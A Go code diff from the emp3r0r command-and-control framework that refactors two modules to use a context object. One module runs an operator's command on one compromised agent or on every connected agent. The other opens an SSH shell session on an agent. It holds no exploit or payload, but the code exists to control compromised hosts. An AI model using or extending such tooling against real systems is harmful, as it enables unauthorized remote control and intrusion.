@@ -1,6 +1,8 @@
 package modules
 
 import (
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
+	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -10,12 +12,11 @@ import (
 var RShellStatus = make(map[string]error)
 
 // moduleCmd exec cmd on target
-func moduleCmd() {
+func moduleCmd(ctx *c2context.C2Context) {
 	// check if ActiveModule and Options are valid
-	if live.ActiveModule == nil || live.ActiveModule.Options == nil {
-		logging.Errorf("moduleCmd: ActiveModule or Options is nil")
-		return
-	}
+	// In context-based approach, we check Flags
+	// but live.ActiveModule might still be used for static config if needed,
+	// but options should come from ctx.Flags
 
 	// send command
 	execOnTarget := func(target *def.Emp3r0rAgent) {
@@ -23,28 +24,29 @@ func moduleCmd() {
 			logging.Errorf("moduleCmd: agent %s is not connected", target.Tag)
 			return
 		}
-		cmdOpt, ok := live.ActiveModule.Options["cmd_to_exec"]
+		cmdOpt, ok := ctx.Flags["cmd_to_exec"]
 		if !ok {
 			logging.Errorf("Option 'cmd_to_exec' not found")
 			return
 		}
-		err := CmdSender(cmdOpt.Val, "", target.Tag)
+		err := CmdSender(cmdOpt, "", target.Tag)
 		if err != nil {
 			logging.Errorf("moduleCmd: %v", err)
 		}
 	}
 
 	// find target
-	target := live.ActiveAgent
+	target := ctx.Target
 	if target == nil {
-		cmdOpt, ok := live.ActiveModule.Options["cmd_to_exec"]
+		cmdOpt, ok := ctx.Flags["cmd_to_exec"]
 		if !ok {
 			logging.Errorf("Option 'cmd_to_exec' not found")
 			return
 		}
-		logging.Warningf("emp3r0r will execute `%s` on all targets this time", cmdOpt.Val)
-		for _, per_target := range live.AgentList {
-			execOnTarget(per_target)
+		logging.Warningf("emp3r0r will execute `%s` on all targets this time", cmdOpt)
+		// Access agent list safely
+		for _, target := range agents.GetConnectedAgents() {
+			execOnTarget(target)
 		}
 		return
 	}
@@ -53,35 +55,35 @@ func moduleCmd() {
 }
 
 // moduleShell set up an ssh session
-func moduleShell() {
+func moduleShell(ctx *c2context.C2Context) {
 	// find target
-	target := live.ActiveAgent
+	target := ctx.Target
 	if target == nil {
 		logging.Errorf("Module shell: target does not exist")
 		return
 	}
 
 	// options
-	shellOpt, ok := live.ActiveModule.Options["shell"]
+	shellOpt, ok := ctx.Flags["shell"]
 	if !ok {
 		logging.Errorf("Option 'shell' not found")
 		return
 	}
-	shell := shellOpt.Val
+	shell := shellOpt
 
-	argsOpt, ok := live.ActiveModule.Options["args"]
+	argsOpt, ok := ctx.Flags["args"]
 	if !ok {
 		logging.Errorf("Option 'args' not found")
 		return
 	}
-	args := argsOpt.Val
+	args := argsOpt
 
-	portOpt, ok := live.ActiveModule.Options["port"]
+	portOpt, ok := ctx.Flags["port"]
 	if !ok {
 		logging.Errorf("Option 'port' not found")
 		return
 	}
-	port := portOpt.Val
+	port := portOpt
 
 	// run
 	err := SSHClient(shell, args, port, false)
